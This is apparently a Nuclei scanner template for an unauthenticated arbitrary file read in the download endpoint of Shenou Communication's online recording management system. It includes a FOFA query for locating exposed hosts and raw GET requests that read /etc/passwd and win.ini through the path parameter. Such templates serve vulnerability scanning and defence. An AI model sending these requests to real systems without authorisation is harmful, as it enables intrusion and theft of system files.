id: shenoutongxin-download-File-reading
info:
  name: 申瓯通信 在线录音管理系统 download 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="在线录音管理系统"
    申瓯通信在线录音管理系统 download 接口处任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://superhero.blog.csdn.net/article/details/139783198
  tags: File reading

http:
  - raw:
      - |
        GET  /main/download?path=/etc/passwd HTTP/1.1 
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '/home/root:'
          - '/bin/sh'
        condition: and
      - type: status
        status: 
          - 200
  - raw:
      - |
        GET  /main/download?path=C:/windows/win.ini HTTP/1.1 
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '; for 16-bit app support'
      - type: status
        status: 
          - 200